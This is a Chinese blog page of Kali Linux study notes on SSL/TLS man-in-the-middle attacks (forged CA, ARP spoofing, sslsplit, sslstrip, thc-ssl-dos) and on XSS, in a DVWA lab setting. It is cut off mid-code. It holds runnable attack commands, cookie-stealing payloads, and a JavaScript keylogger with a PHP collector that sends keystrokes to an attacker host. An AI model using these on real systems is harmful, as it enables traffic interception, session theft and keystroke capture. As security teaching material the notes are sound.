<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;2&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/" itemprop="url">Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击"><a href="#1-中间人攻击" class="headerlink" title="1. 中间人攻击"></a>1. 中间人攻击</h4><ul>
<li>攻击者位于客户端和服务器通信链路中<ul>
<li>ARP（欺骗局域网内所有主机，误认中间人为网关）</li>
<li>DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务）</li>
<li>修改网关（理论上可行，实际上几乎不存在）</li>
<li>修改DNS（设置DNS解析到中间人的服务上）</li>
<li>修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器）</li>
<li>ICMP、STP、OSPF（ICMP的重定向、STP生成树协议、OSPF路由协议）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐STP:生成树协议
1.多个核心层交换机的多线连接，容易形成环路
2.多个核心层交换机的冗杂备份
▲ 交换机物理上的环路，通过生成树协议控制，实现逻辑上的无环路</code></pre></blockquote>
<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&file_name=/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" alt="中间人攻击"></p>
<ul>
<li>加密流量</li>
<li>攻击的前提<ul>
<li>客户端已经信任伪造证书颁发机构</li>
<li>攻击者控制了核发证书颁发机构</li>
<li>客户端程序禁止了显示证书错误告警信息</li>
<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
</ul>
</li>
<li>▲ ARP地址欺骗是实现中间人攻击的因素之一</li>
</ul>
<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
<li>SSLsplit（调用Openssl）<ul>
<li>透明SSL/TLS中间人攻击工具</li>
<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
<li>伪装服务器需要伪造证书</li>
<li>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击</li>
</ul>
</li>
<li>利用openssl生成证书私钥<ul>
<li><strong><code>🔺命令：openssl genrsa -out ca.key 2048</code></strong></li>
</ul>
</li>
<li>利用私钥签名生成证书<ul>
<li><strong><code>🔺命令：openssl req -new -x509 -days（证书时间） 1096 -key ca.key -out ca.crt</code></strong></li>
<li>填写相关信息：Country、Province、Locality Name、Organization、Organizational Name、FQDN Name、Email Address</li>
</ul>
</li>
<li>启用路由（中间人）/proc/sys/net/ipv4/ip_forward<ul>
<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong></li>
</ul>
</li>
<li>iptables端口转发规则<ul>
<li><strong><code>🔺命令：iptables -t nat -F</code></strong>（清空当前所有规则）</li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
<li><strong><code>🔺命令：iptables -t nat -L</code></strong>（查看添加的所有规则）</li>
</ul>
</li>
<li>ARP欺骗<ul>
<li>win7 → <strong><code>🔺命令：arp a（查看网关MAC地址）</code></strong></li>
<li>Kali → <strong><code>🔺命令：arpspoof -l eth0 -t 1.1.1.2（目标主机） -r 1.1.1.1（欺骗的网关）</code></strong>▲ 2020.1.23修改-l参数为-i</li>
</ul>
</li>
<li>启动SSLsplit<ul>
<li><strong><code>🔺命令：mkdir -p test/logdir</code></strong></li>
<li><strong><code>🔺命令：sslsplit -D（debug模式）-l（连接信息记录） connect.log -j（&quot;越狱目录&quot;） /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></strong></li>
</ul>
</li>
<li>被害者访问taobao，baidu，mail.163.com</li>
<li>查看日志和浏览器证书（connect.log，443.log，80.log）</li>
<li>安装服务器根证书后再次访问<ul>
<li>拷贝根证书到win7电脑上</li>
<li>双击证书安装 → 受信任的根证书颁发机构</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐taobao的官网，除了https加密之外，还对数据进行加密（比如密码控件）
⭐全站https和非全站https的区别，非全站https是指对登陆的账户和密码使用https登陆
⭐可以通过grep 12334 * 去查看要查看的信息（搜索日志文件）</code></pre></blockquote>
<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
<li>▲ 自动集成生成一张证书（同SSLsplit的证书不同）</li>
<li>Bug：http(80)/https(443)只能在8080端口侦听</li>
<li>iptables端口转发规则<ul>
<li><strong><code>🔺命令：iptables -t nat -F</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
</ul>
</li>
<li>启动mitmproxy<ul>
<li><strong><code>🔺命令：mitmproxy -T --host -w mitmproxy.log</code></strong>（窗口记录流量）</li>
<li>Tab 下一个信息/q 退出/也可以鼠标点击访问 </li>
<li>▲ 2020.1.24 -T参数修改为 –mode transparent，-host参数被取消</li>
</ul>
</li>
</ul>
<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
<li>自动生成sslstrip.log文件</li>
<li><strong><code>🔺命令：sslstrip -l 8080</code></strong> ▲ 2020.1.24若无法转变，则会报建立安全连接失败</li>
</ul>
<h4 id="5-SSL-TLS拒绝服务攻击"><a href="#5-SSL-TLS拒绝服务攻击" class="headerlink" title="5. SSL/TLS拒绝服务攻击"></a>5. SSL/TLS拒绝服务攻击</h4><ul>
<li>thc-ssl-dos<ul>
<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用ADSL线路打垮30G带宽的服务器</li>
<li>服务器平均可以处理300次/秒SSL握手请求</li>
<li>对SMTPS、POP3等服务同样有效</li>
<li><strong><code>🔺命令：thc-ssl-dos 199.223.209.205 2083 --accept</code></strong> ▲ 2020.1.23 Target has disabled renegotiations.</li>
</ul>
</li>
<li>对策<ul>
<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/" itemprop="url">Kali Linux笔记(五十二)：XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1. XSS"></a>1. XSS</h4><ul>
<li>攻击WEB客户端</li>
<li>客户端脚本语言<ul>
<li>弹窗告警</li>
<li>Javascript</li>
<li>在浏览器中执行</li>
</ul>
</li>
<li>XSS（cross-site scripting）<ul>
<li>▲ 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li>
<li>注入客户端脚本代码</li>
<li>盗取cookie</li>
<li>重定向</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐之前的攻击手段脚本是对服务端的攻击
⭐Browser → Web Applicatipn → Server → Database
⭐服务器WEB站点存在漏洞，Hacker通过客户端提交给WEB站点，攻击WEB客户端</code></pre></blockquote>
<ul>
<li>VBScript（针对微软浏览器），ActiveX，or Flash</li>
<li>JavaScript<ul>
<li>与Java语言无关</li>
<li>命名完全出于市场原因</li>
<li>使用最广的客户端脚本语言</li>
</ul>
</li>
<li>使用场景<ul>
<li>直接嵌入html：<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
<li>元素标签事件：<code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
<li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
<li>其他标签：<code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
<li>DOM对象，篡改页面内容</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐DOM，文本对象模型，每一个页面对应一个DOM对象，每个页面中的元素对应一个DOM对象中的子元素，基于DOM提出了一些API，可以用jS调用DOM的API进行修改元素，不向服务器端发送请求</code></pre></blockquote>
<ul>
<li>攻击参与方<ul>
<li>攻击者</li>
<li>被攻击者</li>
<li>漏洞站点</li>
<li>第三方站点（攻击目标、攻击参与站）</li>
</ul>
</li>
<li>漏洞形成的根源（传入传出无做”消毒”）<ul>
<li>服务器对用户提交数据过滤不严</li>
<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐第三方站点存在xss漏洞（比如第三方站点为淘宝）
1.存放一个js代码
2.客户端每次访问第三方站点，都会下载这个js代码
3.js代码指向一个真正攻击站点，若访问的流量过大，会对真正的目标站点形成DDOS攻击</code></pre></blockquote>
<ul>
<li>XSS漏洞类型（▲ 客户端发送js代码给服务器，服务器原封不动返回js代码给浏览器）<ul>
<li>存储型（持久型，一次注入服务器并保存在服务器上）</li>
<li>反射型（非持久，一次注入服务器，服务器立刻返回给发起方，不保存）</li>
<li>DOM型（本质是反射型，利用浏览器DOM特性，直接在本地执行修改）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐反射型漏洞利用
1.Hacker利用社会工程学调查信息，给受害者发送一封邮件，比如地图等
2.受害者点击地图，会发送地图中的js代码给有漏洞的服务器，js代码可以为监视器等
3.服务器端原端不动发送js代码给受害者
4.js代码到达客户端并在浏览器执行</code></pre></blockquote>
<ul>
<li><p>漏洞PoC  ▲▲ 尝试组合</p>
<ul>
<li><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
<li><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;type&lt;/a&gt;</code>（onclick/onload/onerror）</li>
<li><code>&lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
<li><code>&lt;script&gt;window.location=&quot;http://1.1.1.1&quot;&lt;/script&gt;</code></li>
<li><code>&lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height=&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
<li>▲ 发送Cookies信息：<code>&lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output==&quot;+document.cookie;&lt;/script&gt;</code></li>
<li>▲ 篡改页面：<code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>窃取Cookie</p>
<ul>
<li><strong><code>🔺命令：vi 1.html</code></strong>（body中写入url）</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>a.js源码（隐蔽性强）</p>
<ul>
<li>var img = new Image();</li>
<li>img.src=”<a href="http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐js源码
1.kali，/var/www/html，vi a.js
2.var img = new Image();
3.img.src=&quot;http://1.1.1.1:88/cookies.php?cookie==&quot;+document.cookie;（88端口为nc侦听端口）
4.service apache2 start
5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="2-XSS–键盘记录"><a href="#2-XSS–键盘记录" class="headerlink" title="2. XSS–键盘记录"></a>2. XSS–键盘记录</h4><ul>
<li>Kali上开启apache服务，<strong><code>🔺命令：service apache2 start</code></strong></li>
<li>在kali的/var/www/html/中准备Keylogger.js</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在kali的/var/www/html/中准备Keylogger.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在kali的/var/www/html/中准备keylog.txt，不需要写入数据</li>
<li><strong><code>🔺命令：chmod 777 keylog.txt</code></strong>（保证执行权限）</li>
<li>浏览器中注入<code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code></li>
<li>在浏览器上建立一个a.html <ul>
<li><code>&lt;a href=&quot;http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script +src=&#39;http://192.168.20.8/keylogger.js&#39;&gt;&lt;/script&gt;&quot;&gt;xss（诱惑性语言）&lt;/a&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="3-Xsser–基本使用"><a href="#3-Xsser–基本使用" class="headerlink" title="3. Xsser–基本使用"></a>3. Xsser–基本使用</h4><ul>
<li>命令行/图形化工具</li>
<li>绕过服务器端输入筛选<ul>
<li>10进制/16进制编码</li>
<li>unescape()</li>
</ul>
</li>
<li><strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g（Get方法）/-p（Post方法） &quot;xss_r/?name=XSS（Get方法/Post为body数据段）&quot; --cookie=&quot;securit=low;PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s（测试提交后统计）-v（显示详细信息）--reverse-check（防止hash值误报，提交建立网络连接的js脚本，基于连接是否建立）</code></strong> ▲ 2020.1.20在低安全级别下注入不成功</li>
<li>–heuristi（检查被过滤的字符）</li>
</ul>
<h4 id="4-Xsser–payload编码"><a href="#4-Xsser–payload编码" class="headerlink" title="4. Xsser–payload编码"></a>4. Xsser–payload编码</h4><ul>
<li>对payload编码，绕过服务器端筛选过滤<ul>
<li>–Str      Use method String.FromCharCode()（字符串编码）</li>
<li>–Une      Use Unescape() function ▲ 注释</li>
<li>–Mix      Mix String.FromCharCode() and Unescape()（混合编码）</li>
<li>–Dec      Use Decimal encoding（十进制编码）</li>
<li>–Hex      Use Hexadecimal encoding（十六进制编码）</li>
<li>–Hes      Use Hexadecimal encoding, with semicolons</li>
<li>–Dwo      Encode vectors IP addresses in DWORD（IP地址编码，双字节）</li>
<li>–Doo      Encode vectors IP addresses in Octal（IP地址编码，Octal形式）</li>
<li>–Cem=CEM  Try -manually- different Character Encoding Mutations</li>
<li>(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li>
</ul>
</li>
</ul>
<h4 id="5-Xsser–注入技术"><a href="#5-Xsser–注入技术" class="headerlink" title="5. Xsser–注入技术"></a>5. Xsser–注入技术</h4><ul>
<li>注入技术（多选）<ul>
<li>–Coo      Cross Site Scripting Cookie injection（Cookie注入）</li>
<li>–Xsa      Cross Site Agent Scripting（Agent注入）</li>
<li>–Xsr      Cross Site Referer Scripting（Referer注入）</li>
<li>–Dcp      Data Control Protocol injections（数据控制协议注入）</li>
<li>–Dom      Document Object Model injections（DOM对象注入）</li>
<li>–Lnd      HTTP Response Splitting Induced code（HTTP响应代码）</li>
<li>–Anchor   Use Anchor Stealth payloader (DOM shadows!)</li>
<li>–Phpids   PHP - Exploit PHPIDS bug (0.6.5) to bypass filters（phpids是基于PHP的一个安全框架，存在Bug）</li>
<li>–Doss     XSS Denial of service (server) injection（服务器拒绝服务）</li>
<li>–Dos      XSS Denial of service (client) injection（客户端拒绝服务）</li>
<li>–B64      Base64 code encoding in META tag (rfc2397)（Base64编码）</li>
<li>–Onm      ONM - Use onMouseMove() event to inject code（页面事件注入）</li>
<li>–Ifr      Use <code>&lt;iframe&gt;</code>source tag to inject code（iframe注入）</li>
</ul>
</li>
</ul>
<h4 id="6-XSS–DVWA"><a href="#6-XSS–DVWA" class="headerlink" title="6. XSS–DVWA"></a>6. XSS–DVWA</h4><ul>
<li>Dvwa的XSS reflected（Low）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . $_GET[&apos;name&apos;];</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa的XSS reflected（Medium）–对输出的过滤<ul>
<li>绕过方法：<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa的XSS reflected（High）–对输出的过滤<ul>
<li>▲ htmlspecialchars() → 输出html编码&lt; → &lt; &gt; → &gt;</li>
<li>绕过尝试: <strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></strong></li>
<li>▲ 若注入代码位于&lt;&gt;之内，可以不输入&lt;&gt;，直接输入代码，如Onclick=alert(‘xss’)</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line">    </span><br><span class="line">    $isempty = true;</span><br><span class="line">        </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    </span><br><span class="line">    echo 